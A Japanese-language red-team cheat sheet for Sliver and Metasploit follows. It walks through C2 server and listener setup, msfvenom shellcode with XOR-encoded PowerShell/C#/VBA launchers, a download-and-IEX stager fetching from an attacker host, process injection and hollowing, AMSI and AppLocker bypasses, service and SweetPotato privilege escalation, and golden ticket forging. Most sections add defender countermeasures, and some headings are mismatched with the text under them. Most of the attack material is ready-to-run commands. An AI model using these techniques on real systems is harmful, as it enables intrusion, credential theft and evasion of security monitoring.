01Setupサーバ・クライアント・Armory

Sliver は client-server 型の C2 で、複数 operator を multiplayer モードで受け入れる。Metasploit は単一 console と PostgreSQL バックエンドで workspace / loot を管理する。両フレームワークとも operator ホストに一度導入すればエンゲージメントを跨いで再利用できる。

Sliver — サーバ

BishopFox releases から pre-compiled binary を取得する。multiplayer は明示的に有効化しないと remote operator が attach できない。

bash
# サーバ導入と起動
wget -q https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x ./sliver-server_linux
./sliver-server_linux

# operator profile 生成 (server console 内)
[server] sliver > new-operator -n <OPERATOR> -l <LHOST>
[*] Saved new client config to: /<path>/<OPERATOR>_<LHOST>.cfg

# multiplayer 有効化 (remote client attach に必須)
[server] sliver > multiplayer
[*] Multiplayer mode enabled!

Sliver — クライアント

bash
wget -q https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux
chmod +x ./sliver-client_linux
./sliver-client_linux import /<path>/<OPERATOR>_<LHOST>.cfg
./sliver-client_linux

Sliver — Armory

Armory は 20+ の alias (BOF や .NET assembly) と 100+ の extension を提供し、状況把握・認証情報取得・横展開まで幅広くカバーする。client ごとに一度インストールする。

sliver
sliver > armory install all

# 個別導入
sliver > armory install sharpsh
sliver > armory install stracciatella
sliver > armory install rubeus

Metasploit — console と workspace

PostgreSQL バックエンドが動作していることを確認し (db_status で connected)、engagement 単位で workspace を切り分けると host / credential / loot が独立に管理できる。

bash
sudo systemctl start postgresql
msfconsole -q
msfconsole
msf6 > db_status
msf6 > workspace -a <engagement>
msf6 > workspace <engagement>
msf6 > hosts
msf6 > services -p 445
noteSliver と Metasploit は同一 operator ホスト上に併存させられる。evasion 重視の engagement では Sliver、素早い staging や post-exploitation モジュール利用は MSF、というハイブリッド運用が現実的。cross-framework の受け渡しは msfvenom shellcode を Sliver の execute-shellcode に渡すか、Sliver session から MSF handler に drop する形になる。
防御 / countermeasures
  • operator サブネットからの外向き HTTPS/mTLS 検知 — C2 通信は TLS pinning や self-signed 証明書に依存するため SSL inspection で異常を捉えやすい。
  • EDR による Sliver デフォルト implant シグネチャ検出 (obfuscation で緩和はできるが完全回避ではない)。
  • Blue-team による Shodan / Censys 経由の Sliver / MSF listener インフラ列挙。

02Listeners受信基盤

Listener は implant からの callback を受ける。Sliver は listener (network binding) と profile (payload metadata) を分離するため、TCP で stage を送り HTTP で 2nd stage を扱うといった構成が組みやすい。Metasploit は exploit/multi/handler に payload オプションを合わせる。

Sliver — HTTP / staged listener

profiles new で payload テンプレートを作り、stage-listener で stager 配信 URL を設定、http -L で実際の受信 endpoint を bind する。

sliver
# 64bit shellcode-format profile + HTTP listener
profiles new --http <LHOST>:8088 --format shellcode http-x64
stage-listener --url tcp://<LHOST>:4443 --profile http-x64
http -L <LHOST> --lport 8088

# 32bit variant (AV pipeline が x86 を別処理する環境向け)
profiles new --http <LHOST>:9090 --format shellcode -a x86 http-x86
stage-listener --url tcp://<LHOST>:5553 --profile http-x86
http -L <LHOST> --lport 9090

# service-format profile (jump-psexec 用)
profiles new --http <LHOST>:8099 --format service svc-lateral
http -L <LHOST> --lport 8099

Sliver — mTLS / DNS listener

sliver
# mTLS — 相互認証で暗号化、corporate mTLS 環境に紛れる
mtls -L <LHOST> --lport 8443

# DNS — TXT レコード経由の covert channel
dns -d <C2_DOMAIN> --no-canaries

Metasploit — multi/handler

msfvenom で作った payload の種類・LHOST・LPORT を正確に一致させる。複数 callback を受ける permanent handler にするなら ExitOnSession false。

msfconsole
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <LHOST>
msf6 > set LPORT 4443
msf6 > set EXITFUNC thread
msf6 > set ExitOnSession false
msf6 > exploit -j

# 代表的な payload 別 option
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_winhttps
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp   # x86
noteHTTPS payload を redirector 経由で扱う場合は OverrideRequestHost true。StagerVerifySSLCert false は self-signed の検証時のみで、本番 engagement では設定しない。
防御 / countermeasures
  • Beacon 定期性の anomaly 検知 (jitter / interval が固定なコールバックは NetFlow / Zeek で目立つ)。
  • JA3/JA4 TLS 指紋による Sliver の Go スタック・MSF の Ruby スタック識別。
  • 非対話ホストからの珍しい user-agent 文字列 — Sliver のデフォルト UA は publicly indexed。

03Payloads投下物

Sliver は MSF が生成した shellcode を XOR エンコードした launcher (VBA/PowerShell/C#/ASPX) に埋める運用が主流。あるいは Sliver ネイティブの generate beacon で obfuscation 込みの単独 implant を得る。Metasploit の msfvenom は両フローの起点となる shellcode ジェネレータ。

Metasploit — msfvenom shellcode

raw 出力は下流のエンコード工程すべての入力になる。EXITFUNC=thread は process より安全で in-process 実行に向く (host process を残す)。

bash
# x64 raw shellcode
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<LHOST> LPORT=4443 EXITFUNC=thread \
  -f raw -o <PAYLOAD_PATH>/payload.x64.bin

# x86 raw shellcode
sudo msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<LHOST> LPORT=5553 EXITFUNC=thread \
  -f raw -o <PAYLOAD_PATH>/payload.x86.bin

# staged reverse_https の直接 EXE (AlwaysInstallElevated 等で有用)
sudo msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=<LHOST> LPORT=8443 EXITFUNC=thread \
  -f exe -o <PAYLOAD_PATH>/payload.x64.exe

XOR エンコード launcher (raw shellcode から生成)

単一 byte key での XOR (下記例では 2) は raw meterpreter バイト列に対する signature ベース AMSI/AV マッチを避ける。key は engagement ごとに変えるのが原則。

bash
# PowerShell $buf 配列 (XOR key = 2)
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4443 EXITFUNC=thread -f raw \
  | xxd -ps -c 1 \
  | python3 -c 'import sys; key = 2; print("[Byte[]] $buf = " + ",".join([f"0x{(int(x, 16) ^ key):02X}" for x in sys.stdin.read().split()]))'

# C# byte[] buf (XOR key = 2)
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4443 EXITFUNC=thread -f raw \
  | python3 -c 'key = 2; import sys; data = sys.stdin.buffer.read(); enc = bytes([b ^ key for b in data]); print(f"byte[] buf = new byte[{len(enc)}] {{ " + ", ".join([f"0x{b:02X}" for b in enc]) + " };")'

# VBA / VBS Array (XOR key = 2、行長制限のため chunk 化)
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=5553 EXITFUNC=thread -f raw \
  | xxd -ps -c 1 \
  | python3 -c 'import sys; key = 2; data = [str(int(x, 16) ^ key) for x in sys.stdin.read().split()]; cs = 50; ck = [data[i:i+cs] for i in range(0, len(data), cs)]; print("buf = Array(", end=""); print(", _\n".join([", ".join(c) for c in ck]) + ")")'

PowerShell one-liner stager

attacker の HTTP サーバから 2nd stage スクリプトを取得して IEX 実行する。-EncodedCommand は UTF-16LE + base64 前提。

bash
echo -en "(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/payload.ps1') | IEX" \
  | iconv -t UTF-16LE | base64 -w 0

# 対象上での実行
powershell -enc <BASE64_PAYLOAD>

Sliver — ネイティブ beacon

Sliver の generate beacon は obfuscation と AMSI 回避が組込まれた単独 implant を生成する。--evasion でさらに硬く、代わりにサイズが増える。

sliver
profiles new --http <LHOST>:8088 --format shellcode http-x64
http -L <LHOST> --lport 8088

generate beacon --http <STAGING>:8088 \
  --name payload.obfuscated --os windows \
  --seconds 5 --jitter 0 --evasion
防御 / countermeasures
  • msfvenom shellcode の prologue と Sliver implant のフレーミングに対する YARA rule (両者とも publicly indexed)。
  • AMSI — 現行 Defender は素の meterpreter blob を検出。XOR + in-memory 配信は AMSI bypass と組み合わせて初めて効く (evasion 参照)。
  • 外向き DNS/HTTP のロギングで stager fetch 先の異常検知。

04Session Opsセッション安定化

初回の callback は不安定 (Word / ブラウザ / one-shot loader 由来のプロセスは短命)。長寿命の安定プロセス (explorer, svchost, notepad) への migrate は基本衛生。Sliver は migrate / execute-shellcode -p / hollow を提供、Metasploit は古典 migrate + post module。

Sliver — 犠牲プロセス生成と injection

まず犠牲プロセスを起動 (現ユーザコンテキスト継承)、PID を ps で拾って inject。notepad が定番の犠牲、svchost は hollowing の最適候補。

sliver
# 犠牲プロセス起動 (shellcode の arch と一致させる)
execute C:\\windows\\system32\\notepad.exe
execute -T notepad
execute C:\\windows\\SysWOW64\\notepad.exe   # x86

# または Rubeus createnetonly (別 logon context でプロセス生成)
rubeus -t 20 -- createnetonly /program:C:\\windows\\SysWOW64\\notepad.exe
rubeus -t 20 -- createnetonly /program:C:\\windows\\system32\\cmd.exe

# PID 特定
ps -e notepad
ps -e explorer   # explorer.exe = 長寿命の host、beacon に理想的

Sliver — PID への shellcode inject

sliver
# x86 injection (arch は自動判定)
execute-shellcode -A 386 -p <PID> <PAYLOAD_PATH>/payload.x86.bin
execute-shellcode -p <PID> <PAYLOAD_PATH>/payload.x86.bin

# x64 injection + ShikataGaNai + reflection
execute-shellcode -p <PID> <PAYLOAD_PATH>/payload.x64.bin
execute-shellcode -S -r -I 10 -p <PID> <PAYLOAD_PATH>/payload.x64.bin

# Sliver ネイティブの migrate
migrate -p <PID>

Sliver — process hollowing

Hollowing は suspended svchost を生成し image を unmap して shellcode を書き込む。evasion 面で最も強いが、しばしば無害なエラーを吐く (shell は正常に取れる)。

sliver
hollow svchost.exe <PAYLOAD_PATH>/payload.x64.bin

# 想定される無害エラー (shell 自体は成立):
[!] Call extension error: rpc error: code = Unknown desc = The parameter is incorrect.

Metasploit — migrate と post モジュール

meterpreter
meterpreter > ps
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe   # 名前指定
msfconsole
# auto-migrate post module
msf6 > use post/windows/manage/migrate
msf6 > set SESSION <id>
msf6 > set NAME explorer.exe
msf6 > run

# session 死活時の自動復活 (persistence)
msf6 > use exploit/windows/local/persistence
msf6 > set SESSION <id>
msf6 > run
noteAV 検知される可能性のあるツール (SweetPotato, mimikatz 等) を実行する前に、必ず svchost へ hollow して implant を複製する。犠牲 notepad に残った primary implant は defender 起動時に確実に殺される。
要点 / key takeaways
  • 初回 callback のプロセスから直接運用しない。即座に migrate すべし。
  • arch を明示的に一致させる (x86 shellcode を x64 プロセスに、逆も、silently にクラッシュする)。
  • EDR 有り環境では hollowing が最も robust。ただし parameter incorrect エラーが出る点は許容する。

05BypassesAMSI / CLM / Application Whitelisting

Sliver-specific な bypass 実行手段のみここに集約する。AMSI patch / CLM 脱出 / AppLocker 迂回の原理そのものは evasion sheet が本文。ここでは Sliver 上でどう callable にするかを扱う。

SharpSh — AMSI-clean な PowerShell 子プロセス

SharpSh は AMSI patch 済みの powershell child process を spawn し、そこで任意コマンドを走らせる仕組み。Sliver から execute-assembly で呼ばれ、遠隔からダウンロードした .ps1 に対して string parameter を渡せる。長いコマンドは base64 encoded で -e -c に渡し、256 文字を超える場合は -i フラグで in-process 実行する (donut backend の制限回避)。

sliver
# 単一コマンド実行
sharpsh -t 20 -- '-c "whoami /all"'
sharpsh -t 20 -- '-c "$ExecutionContext.SessionState.LanguageMode"'

# 引数なしスクリプトを URL から (適当なダミー引数 1 が必要)
sharpsh -t 200 -- '-u http://<LHOST>/PowerUp.ps1 -c 1'

# 引数付き実行
sharpsh -t 20 -- '-u http://<LHOST>/PowerUp.ps1 -c "Invoke-AllChecks"'
sharpsh -t 200 -- '-u http://<LHOST>/HostRecon.ps1 -c "Invoke-HostRecon"'

# 引用符を大量含むコマンドは base64 化 (-e -c) で渡す
sharpsh -- -e -c <BASE64_COMMAND>

# 256 文字超のコマンドは in-process (-i) で実行
sharpsh -i -t 40 -- -u 'http://<LHOST>/Invoke-Mimikatz.ps1' -e -c <BASE64_COMMAND>

Stracciatella — unmanaged PowerShell runspace

Stracciatella は AMSI/ScriptBlockLogging が触れない unmanaged runspace で PowerShell を実行する。SharpSh と同じ引数体系。CLM 有効環境で FullLanguage を得たいときに有用。

sliver
execute-assembly -i <TOOL_DIR>/Stracciatella.exe \
  -c "$ExecutionContext.SessionState.LanguageMode"

Application Whitelisting — execute-assembly modes

Sliver は C# バイナリを implant プロセス内で走らせる 2 系統を持つ。execute-assembly -i は sacrificial process を作らず inline で実行 (最も静か)、inline-execute-assembly は BOF 相当の実装。両者とも AppLocker が .exe 実行を制限している環境で assembly を通過させる。

sliver
# execute-assembly — armory alias 経由
sharpup -- audit
sharpup -i -- audit
execute-assembly -i -- <TOOL_DIR>/SharpUp.exe audit

# inline-execute-assembly (BOF)
inline-execute-assembly <TOOL_DIR>/SharpUp.exe audit
noteAMSI patch / CLM bypass / AppLocker の LOLBAS 手法は evasion sheet で機序解説あり。ここではあくまで「Sliver からどう呼ぶか」に絞る。Metasploit は AMSI 対策を base 機能に持たないため、PowerShell Empire 由来の技法 (set AutoRunScript post/windows/manage/killav 等) で個別回避する構成になる。
防御 / countermeasures
  • PowerShell ScriptBlockLogging (EID 4104) と ModuleLogging を全 endpoint で有効化。Stracciatella は unmanaged pipeline で回避するが、それ自体の binary sig は EDR で拾える。
  • WDAC / AppLocker policy で .NET assembly の execute-from-memory も拒否 (単純 .exe 拒否では execute-assembly 系を止められない)。
  • AMSI provider の integrity 監視 — patch されているかどうか自体を検知。

Modifiable Service

非 admin が binPath を変更できるサービスを悪用する。service バイナリを「現ユーザを Administrators に追加するコマンド」に書き換え、サービス再起動時に SYSTEM 権限で実行させる。

sliver

execute -o sc qc <SERVICE_NAME>
execute -o sc config <SERVICE_NAME> binPath= "net localgroup Administrators domain.com\\<USER> /add" obj= "NT AUTHORITY\\SYSTEM"
execute -o sc config <SERVICE_NAME> start= auto
execute -o sc start <SERVICE_NAME>

# local admins メンバシップ検証
execute -o net localgroup administrators
msfconsole
msf6 > use exploit/windows/local/service_permissions
msf6 > set SESSION <id>
msf6 > run

SeImpersonate — SweetPotato

SeImpersonatePrivilege 保持プロセス (IIS worker, MSSQL service 等) は *Potato 系で悪用可能。SweetPotato + EfsRpc モードが最新 Windows Server で最も reliable。donut で PIC 化してから execute-shellcode に食わせる。

bash
# SweetPotato.exe を PIC shellcode に変換 (donut)
donut -i <TOOL_DIR>/SweetPotato.exe -a 2 -b 2 \
  -p "-p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a \"IEX((New-Object Net.WebClient).DownloadString('http://<LHOST>/payload.ps1'))\"" \
  -o <TOOL_DIR>/SweetPotato.bin

# EfsRpc variant (default モードが不発なとき)
donut -i <TOOL_DIR>/SweetPotato.exe -a 2 -b 2 \
  -p "-e EfsRpc -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a \"IEX((New-Object Net.WebClient).DownloadString('http://<LHOST>/payload.ps1'))\"" \
  -o <TOOL_DIR>/SweetPotato.bin
sliver
# 犠牲プロセス + SweetPotato shellcode inject (推奨)
execute notepad
ps -e notepad
execute-shellcode -S -r -I 30 -p <PID> <TOOL_DIR>/SweetPotato.bin

# in-process 版 (速いが安定性劣る)
execute-shellcode -i -S -r -I 30 <TOOL_DIR>/SweetPotato.bin

# 直接 assembly 実行
execute-assembly <TOOL_DIR>/SweetPotato.exe \
  -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \
  -a "-ep bypass -nop iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/payload.ps1')"

# shell 確立後は即座に svchost hollowing (SweetPotato host は AV で殺される)
hollow svchost.exe <PAYLOAD_PATH>/payload.x64.bin

sudo cp alwaysInstallElevated.msi /var/www/html

sliver

UAC Bypass — Fodhelper / ComputerDefaults

Compromised host からアクセスできるが operator から直接届かない内部ネットワークに接続するためのフォワーディング。Sliver は portfwd / socks5 / Ligolo 連携を提供。Metasploit は autoroute + socks_proxy の組合せが古典。

  • Sysmon EID 1 (プロセス生成) で ParentImage=services.exe かつ子プロセスが非典型なもの — psexec の service drop を捕捉。
  • EID 4624 (logon) type 3 (network) が workstation → workstation 間で発生 — 通常業務ではまず起きない横移動。
  • EID 5140 (share access) — 非 admin source から admin$ / c$ へのアクセス。
  • WMI 活動ログ (Microsoft-Windows-WMI-Activity/Operational) — jump-wmiexec は必ず痕跡を残す。
  • RDP 制限 (NLA + jump server 経由 + virtual channel パターン監視で SharpRDP の signature 検出)。

Golden Ticket — Child → Parent Domain

child domain の krbtgt hash を DCSync で取得後、parent domain SID を含む sidhistory を仕込んで forge。-519 は Enterprise Admins RID (固定)。

sliver

sharpsh -t 20 -- '-u http://<LHOST>/PowerView.ps1 -c "Get-DomainSid -Domain <PARENT_DOMAIN>"'

# golden forge — sid=child, sids=parent_sid-519 (EA)
rubeus -t 30 -- golden /rc4:<CHILD_KRBTGT_NTLM> \
  /sid:<CHILD_SID> \
  /sids:<PARENT_SID>-519 \
  /ldap /user:Administrator /domain:<CHILD_DOMAIN> /nowrap /ptt

# parent DC アクセス確認
execute -o klist
ls //<PARENT_DC>/c$
psexec -d <SVC_TITLE> -s <SVC_DESC> -p svc-lateral <PARENT_DC>

防御 / countermeasures
  • Kerberoast 検知 — EID 4769 Kerberos TGS request で ticket encryption type=0x17 (RC4-HMAC) を全件警告 (現代環境は AES 中心)。
  • DCSync 検知 — DS-Replication-Get-Changes* 権限保有者を Domain Controllers / krbtgt / Enterprise Domain Controllers のみに限定、EID 4662 で全件監視。
  • Delegation — Unconstrained delegation を保持する host は "Sensitive & cannot be delegated" 属性で保護、Protected Users group メンバは delegation 対象外。
  • RBCD 検知 — msds-allowedtoactonbehalfofotheridentity 属性書き込みを EID 5136 で監視、DC でも同様。
  • krbtgt password を最低年 1 回 rotate (2 回 rotation) — Golden ticket の TTL 制限。
